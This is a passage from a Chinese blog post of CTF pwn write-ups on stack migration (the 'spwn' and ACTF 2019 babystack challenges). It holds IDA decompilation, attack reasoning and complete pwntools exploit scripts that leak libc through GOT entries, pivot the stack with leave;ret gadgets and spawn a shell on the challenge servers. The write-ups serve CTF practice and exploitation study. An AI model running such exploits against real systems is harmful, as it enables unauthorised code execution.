flat([buf1,system_add,system_add,binsh_add])</span><br><span class="line">raw_input(&apos;-&gt;&apos;)</span><br><span class="line"># sleep(0.1)</span><br><span class="line">io.sendline(p)</span><br><span class="line">io.interactive()</span><br></pre></td></tr></table></figure>

<h2 id="spwn"><a href="#spwn" class="headerlink" title="spwn"></a>spwn</h2><h3 id="查保护和arch-1"><a href="#查保护和arch-1" class="headerlink" title="查保护和arch"></a>查保护和arch</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">Arch:     i386-32-little</span><br><span class="line">  RELRO:    Partial RELRO</span><br><span class="line">  Stack:    No canary found</span><br><span class="line">  NX:       NX enabled</span><br><span class="line">  PIE:      No PIE (0x8048000)</span><br></pre></td></tr></table></figure>

<h3 id="尝试运行"><a href="#尝试运行" class="headerlink" title="尝试运行"></a>尝试运行</h3><p><img src="/2020/02/11/Stack Migration题目练习/images/15817739064330.jpg" alt="-w602"></p>
<h3 id="ida分析-2"><a href="#ida分析-2" class="headerlink" title="ida分析"></a>ida分析</h3><p>直接看漏洞函数</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">ssize_t vul_function()</span><br><span class="line">&#123;</span><br><span class="line">  size_t v0; // eax</span><br><span class="line">  size_t v1; // eax</span><br><span class="line">  char buf; // [esp+0h] [ebp-18h]</span><br><span class="line">  v0 = strlen(m1);</span><br><span class="line">  write(1, m1, v0);                             // Hello good Ctfer</span><br><span class="line">  read(0, &amp;s, 0x200u);</span><br><span class="line">  v1 = strlen(m2);</span><br><span class="line">  write(1, m2, v1);                             // What do you want to say?</span><br><span class="line">  return read(0, &amp;buf, 0x20u);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>发现可以利用的gadget只有一个，那就只有leave的gadget了，然后把ebp控制到前面的read函数的s处，其也是全局变量，地址固定。<br><img src="/2020/02/11/Stack Migration题目练习/images/15817774030678.jpg" alt="-w358"></p>
<h4 id="攻击思路-2"><a href="#攻击思路-2" class="headerlink" title="攻击思路"></a>攻击思路</h4><ol>
<li>在第一个read的时候，直接把构造的rop链读进去。任务分别是leak 一个函数的内存地址，来用libcseacher算出system，跟/bin/sh字符串的地址，返回start函数清理栈开启第二次使用漏洞； call system（/bin/sh）</li>
<li>然后第二个read时候，把控ebp指向固定地址s的地址，retaddress 放上leave的gadget。</li>
</ol>
<h3 id="exp-2"><a href="#exp-2" class="headerlink" title="exp"></a>exp</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br></pre></td><td class="code"><pre><span class="line">from pwn import *</span><br><span class="line">context.arch = &apos;i386&apos;</span><br><span class="line">context.log_level = &apos;debug&apos;</span><br><span class="line">from LibcSearcher import *</span><br><span class="line">e = ELF(&apos;./spwn&apos;)</span><br><span class="line">io = process(&apos;./spwn&apos;)</span><br><span class="line"># libc = e.libc</span><br><span class="line">io = remote(&apos;node3.buuoj.cn&apos;,28527)</span><br><span class="line">padding = 24</span><br><span class="line">s = 0x0804A300</span><br><span class="line">fake1 = 0x0804A500</span><br><span class="line">leave_ret = 0x08048511</span><br><span class="line">puts_add = e.symbols[&apos;puts&apos;]</span><br><span class="line">write_plt = e.symbols[&apos;write&apos;]</span><br><span class="line">write_got = e.got[&apos;write&apos;]</span><br><span class="line">io.recvuntil(&apos;name?&apos;)</span><br><span class="line">p = flat([fake1,write_plt,0x080483A0,1,write_got,10])</span><br><span class="line">io.send(p)</span><br><span class="line">io.recvuntil(&apos;say?&apos;)</span><br><span class="line">p = padding * &apos;a&apos; + p32(s) + p32(leave_ret)</span><br><span class="line"># raw_input(&apos;-&gt;&apos;)</span><br><span class="line">io.send(p)</span><br><span class="line">write_add = u32(io.recv(4))</span><br><span class="line">print(hex(write_add))</span><br><span class="line">obj = LibcSearcher(&apos;write&apos;,write_add)</span><br><span class="line">libc_base = write_add - obj.dump(&apos;write&apos;) #libc.symbols[&apos;write&apos;]</span><br><span class="line">print(hex(obj.dump(&apos;write&apos;)))</span><br><span class="line">print(hex(libc_base))</span><br><span class="line">sys_add = libc_base + obj.dump(&apos;system&apos;) #libc.symbols[&apos;system&apos;]</span><br><span class="line">binsh_add =libc_base + obj.dump(&apos;str_bin_sh&apos;) #libc.search(&apos;/bin/sh\x00&apos;).next()</span><br><span class="line">io.recvuntil(&apos;name?&apos;)</span><br><span class="line">p = flat([fake1,sys_add,0x080483A0,binsh_add])</span><br><span class="line">io.send(p)</span><br><span class="line">io.recvuntil(&apos;say?&apos;)</span><br><span class="line">p = padding * &apos;a&apos; + p32(s) + p32(leave_ret)</span><br><span class="line">io.send(p)</span><br><span class="line">io.interactive()</span><br></pre></td></tr></table></figure>

<h2 id="ACTF-2019-hardcore-fmt"><a href="#ACTF-2019-hardcore-fmt" class="headerlink" title="ACTF_ 2019_hardcore fmt"></a>ACTF_ 2019_hardcore fmt</h2><h3 id="查保护和arch-2"><a href="#查保护和arch-2" class="headerlink" title="查保护和arch"></a>查保护和arch</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">[*] &apos;/media/psf/mypwn2/buuctf/actf_2019_babystack/ACTF_2019_babystack&apos;</span><br><span class="line">    Arch:     amd64-64-little</span><br><span class="line">    RELRO:    Partial RELRO</span><br><span class="line">    Stack:    No canary found</span><br><span class="line">    NX:       NX enabled</span><br><span class="line">    PIE:      No PIE (0x400000)</span><br></pre></td></tr></table></figure>

<h3 id="ida分析-3"><a href="#ida分析-3" class="headerlink" title="ida分析"></a>ida分析</h3><p>￼￼￼￼<br><img src="http://q5j29gptn.bkt.clouddn.com/uPic/oj5gX3.png" alt><br>其中可以看到后面的read处，存在一个栈溢出，但是只有一个gadget可以用，需要考虑Stack Migration。其中那个<strong>sub400a1a</strong>函数是问你需要留下多少的字节，肯定要<code>0xe0</code>，所以再送过去的时候就填入0xe0，正好做参数给下面read函数用。</p>
<p>然后程序接受到0xe0后，进入if语句中，会输出一下堆栈esp的值，这下也是相当于知道了一个特定的地址，然后就正常构造rop链，把控ebp等于为接收到的stack esp，再跟上leava gadget即可。</p>
<h3 id="exp-3"><a href="#exp-3" class="headerlink" title="exp"></a>exp</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> LibcSearcher <span class="keyword">import</span> *</span><br><span class="line">context.log_level = <span class="string">'debug'</span></span><br><span class="line">context.arch = <span class="string">'amd64'</span></span><br><span class="line"><span class="comment"># io = process('./ACTF_2019_babystack')</span></span><br><span class="line"><span class="comment"># io = remote('node3.buuoj.cn',27626)</span></span><br><span class="line">io = remote(<span class="string">'challenge-848a378609341016.sandbox.ctfhub.com'</span>, <span class="number">24656</span>)</span><br><span class="line">elf = ELF(<span class="string">'./ACTF_2019_babystack'</span>)</span><br><span class="line"><span class="comment"># libc = elf.libc</span></span><br><span class="line">io.recvuntil(<span class="string">'message?\n'</span>)</span><br><span class="line">io.sendline(<span class="string">'224'</span>)</span><br><span class="line">io.recvuntil(<span class="string">'saved at'</span>)</span><br><span class="line">stack_addr =  int((io.recvline_contains(<span class="string">'0x7f'</span>)),<span class="number">16</span>)</span><br><span class="line">print(stack_addr)</span><br><span class="line">libc_start_main_got = elf.got[<span class="string">'__libc_start_main'</span>]</span><br><span class="line">puts_plt = elf.symbols[<span class="string">'puts'</span>]</span><br><span class="line">pop_rdi_ret = <span class="number">0x000400ad3</span></span><br><span class="line">start_addr = <span class="number">0x000400800</span></span><br><span class="line">leave_ret = <span class="number">0x400a18</span> </span><br><span class="line">payload = flat([<span class="string">'\x00'</span>*<span class="number">8</span>,pop_rdi_ret,libc_start_main_got,puts_plt,start_addr])</span><br><span class="line">payload = payload.ljust(<span class="number">208</span>,<span class="string">'a'</span>)</span><br><span class="line">payload += flat([stack_addr,leave_ret])</span><br><span class="line">io.recvuntil(<span class="string">'&gt;'</span>)</span><br><span class="line">raw_input(<span class="string">'-&gt;'</span>)</span><br><span class="line">io.send(payload)</span><br><span class="line">io.recvuntil(<span class="string">'bye~\n'</span>)</span><br><span class="line">libc_start_main_addr = u64(io.recv(<span class="number">6</span>).ljust(<span class="number">8</span>,<span class="string">'\x00'</span>)) <span class="comment">#- libc.symbols['__libc_start_main']</span></span><br><span class="line">obj = LibcSearcher(<span class="string">'__libc_start_main'</span>,libc_start_main_addr)</span><br><span class="line">libc_base = libc_start_main_addr - obj.dump(<span class="string">'__libc_start_main'</span>)</span><br><span class="line">print(hex(libc_base))</span><br><span class="line">io.recvuntil(<span class="string">'message?\n'</span>)</span><br><span class="line">io.sendline(<span class="string">'224'</span>)</span><br><span class="line">io.recvuntil(<span class="string">'saved at'</span>)</span><br><span class="line">stack_addr =  int((io.recvline_contains(<span class="string">'0x7f'</span>)),<span class="number">16</span>)</span><br><span class="line">print(stack_addr)</span><br><span class="line">rec = libc_base + <span class="number">0x4f2c5</span></span><br><span class="line">payload = flat([<span class="string">'\x00'</span>*<span class="number">8</span>,rec])</span><br><span class="line">payload = payload.ljust(<span class="number">208</span>,<span class="string">'\x00'</span>)</span><br><span class="line">payload += flat([stack_addr,leave_ret])</span><br><span class="line">io.recvuntil(<span class="string">'&gt;'</span>)</span><br><span class="line">raw_input(<span class="string">'-&gt;'</span>)</span><br><span class="line">io.send(payload)</span><br><span class="line">io.interactive()</span><br></pre></td></tr></table></figure>


        </div>

        <blockquote class="post-copyright">
    
    <div class="content">
        
<span class="post-time">
    Last updated: <time datetime="2020-02-18T12:20:29.000Z" itemprop="dateUpdated">2020-02-18 20:20:29</time>
</span><br>


        
    </div>
    
    <footer>
        <a href="http://chumen77.xyz">
            <img src="/img/avatar.jpg" alt="chumen77">
            chumen77
        </a>
    </footer>
</blockquote>

        


        <div class="post-footer">
            

            
<div class="page-share-wrap">
    

<div class="page-share" id="pageShare">
    <ul class="reset share-icons">
      <li>
        <a class="weibo share-sns" target="_blank" href="http://service.weibo.com/share/share.php?url=http://chumen77.xyz/2020/02/11/Stack Migration题目练习/&title=《Stack Migration题目练习》 — Welcome to Chumen77's Blog&pic=http://chumen77.xyz/img/avatar.jpg" data-title="微博">
          <i class="icon icon-weibo"></i>
        </a>
      </li>
      <li>
        <a class="weixin share-sns wxFab" href="javascript:;" data-title="微信">
          <i class="icon icon-weixin"></i>
        </a>
      </li>
      <li>
        <a class="qq share-sns" target="_blank" href="http://connect.qq.com/widget/shareqq/index.html?url=http://chumen77.xyz/2020/02/11/Stack Migration题目练习/&title=《Stack Migration题目练习》 — Welcome to Chumen77's Blog&source=" data-title=" QQ">
          <i class="icon icon-qq"></i>
        </a>
      </li>
      <li>
        <a class="facebook share-sns" target="_blank" href="https://www.facebook.com/sharer/sharer.php?u=http://chumen77.xyz/2020/02/11/Stack Migration题目练习/" data-title=" Facebook">
          <i class="icon icon-facebook"></i>
        </a>
      </li>
      <li>
        <a class="twitter share-sns" target="_blank" href="https://twitter.com/intent/tweet?text=《Stack Migration题目练习》 — Welcome to Chumen77's Blog&url=http://chumen77.xyz/2020/02/11/Stack Migration题目练习/&via=http://chumen77.xyz" data-title=" Twitter">
          <i class="icon icon-twitter"></i>
        </a>
      </li>
      <li>
        <a class="google share-sns" target="_blank" href="https://plus.google.com/share?url=http://chumen77.xyz/2020/02/11/Stack Migration题目练习/" data-title=" Google+">
          <i class="icon icon-google-plus"></i>
        </a>
      </li>
    </ul>
 </div>



    <a href="javascript:;" id="shareFab" class="page-share-fab waves-effect waves-circle">
        <i class="icon icon-share-alt icon-lg"></i>
    </a>
</div>



        </div>
    </div>

    
<nav class="post-nav flex-row flex-justify-between">
  
    <div class="waves-block waves-effect prev">
      <a href="/2020/02/14/linux下clash的使用/" id="post-prev" class="post-nav-link">
        <div class="tips"><i class="icon icon-angle-left icon-lg icon-pr"></i> Prev</div>
        <h4 class="title">linux下clash的使用</h4>
      </a>
    </div>
  

  
    <div class="waves-block waves-effect next">
      <a href="/2020/02/05/花式栈溢出（调节栈帧）/" id="post-next" class="post-nav-link">
        <div class="tips">Next <i class="icon icon-angle-right icon-lg icon-pl"></i></div>
        <h4 class="title">花式栈溢出（栈帧的调节）</h4>
      </a>
    </div>
  
</nav>



    




















</article>



</div>

        <footer class="footer">
    <div class="top">
        
<p>
    <span id="busuanzi_container_site_uv" style='display:none'>
        站点总访客数：<span id="busuanzi_value_site_uv"></span>
    </span>
    <span id="busuanzi_container_site_pv" style='display:none'>
        站点总访问量：<span id="busuanzi_value_site_pv"></span>
    </span>
</p>


        <p>
            
                <span><a href="/atom.xml" target="_blank" class="rss" title="rss"><i class="icon icon-lg icon-rss"></i></a></span>
            
            <span>This blog is licensed under a <a rel="license" href="https://creativecommons.org/licenses/by/4.0/">Creative Commons Attribution 4.0 International License</a>.</span>
        </p>
    </div>
    <div class="bottom">
        <p><span>chumen77 &copy; 2019 - 2020</span>
            <span>
                
                <a href="http://www.miitbeian.gov.cn/" target="_blank">豫ICP备20003962号</a><br>
                
                Power by <a href="http://hexo.io/" target="_blank">Hexo</a> Theme <a href="https://github.com/yscoder/hexo-theme-indigo" target="_blank">indigo</a>
            </span>
        </p>
    </div>
</footer>

    </main>
    <div class="mask" id="mask"></div>
<a href="javascript:;" id="gotop" class="waves-effect waves-circle waves-light"><span class="icon icon-lg icon-chevron-up"></span></a>



<div class="global-share" id="globalShare">
    <ul class="reset share-icons">
      <li>
        <a class="weibo share-sns" target="_blank" href="http://service.weibo.com/share/share.php?url=http://chumen77.xyz/2020/02/11/Stack Migration题目练习/&title=《Stack Migration题目练习》 — Welcome to Chumen77's Blog&pic=http://chumen77.xyz/img/avatar.jpg" data-title="微博">
          <i class="icon icon-weibo"></i>
        </a>
      </li>
      <li>
        <a class="weixin share-sns wxFab" href="javascript:;" data-title="微信">
          <i class="icon icon-weixin"></i>
        </a>
      </li>
      <li>
        <a class="qq share-sns" target="_blank" href="http://connect.qq.com/widget/shareqq/index.html?url=http://chumen77.xyz/2020/02/11/Stack Migration题目练习/&title=《Stack Migration题目练习》 — Welcome to Chumen77's Blog&source=" data-title=" QQ">
          <i class="icon icon-qq"></i>
        </a>
      </li>
      <li>
        <a class="facebook share-sns" target="_blank" href="https://www.facebook.com/sharer/sharer.php?u=http://chumen77.xyz/2020/02/11/Stack Migration题目练习/" data-title=" Facebook">
          <i class="icon icon-facebook"></i>
        </a>
      </li>
      <li>
        <a class="twitter share-sns" target="_blank" href="https://twitter.com/intent/tweet?text=《Stack Migration题目练习》 — Welcome to Chumen77's Blog&url=http://chumen77.xyz/2020/02/11/Stack Migration题目练习/&via=http://chumen77.xyz" data-title=" Twitter">
          <i class="icon icon-twitter"></i>
        </a>
      </li>
      <li>
        <a class="google share-sns" target="_blank" href="https://plus.google.com/share?url=http://chumen77.xyz/2020/02/11/Stack Migration题目练习/" data-title=" Google+">
          <i class="icon icon-google-plus"></i>
        </a>
      </li>
    </ul>
 </div>


<div class="page-modal wx-share" id="wxShare">
    <a class="close" href="javascript:;"><i class="icon icon-close"></i></a>
    <p>扫一扫，分享到微信</p>
    <img src="//api.qrserver.com/v1/create-qr-code/?data=http://chumen77.xyz/2020/02/11/Stack Migration题目练习/" alt="微信分享二维码">
</div>




    <script src="//cdn.bootcss.com/node-waves/0.7.4/waves.min.js"></script>
<script>
var BLOG = { ROOT: '/', SHARE: true, REWARD: false };


</script>

<script src="//unpkg.com/hexo-theme-material-indigo@latest/js/main.min.js"></script>


<div class="search-panel" id="search-panel">
    <ul class="search-result" id="search-result"></ul>
</div>
<template id="search-tpl">
<li class="item">
    <a href="{path}" class="waves-block waves-effect">
        <div class="title ellipsis" title="{title}">{title}</div>
        <div class="flex-row flex-middle">
            <div class="tags ellipsis">
                {tags}
            </div>
            <time class="flex-col time">{date}</time>
        </div>
    </a>
</li>
</template>

<script src="//unpkg.com/hexo-theme-material-indigo@latest/js/search.min.js" async></script>






<script async src="//busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script>



<script>
(function() {
    var OriginTitile = document.title, titleTime;
    document.addEventListener('visibilitychange', function() {
        if (document.hidden) {
            document.title = '死鬼去哪里了！';
            clearTimeout(titleTime);
        } else {
            document.title = '(つェ⊂)咦!又好了!';
            titleTime = setTimeout(function() {
                document.title = OriginTitile;
            },2000);
        }
    });
})();
</script>



</body>
</html>
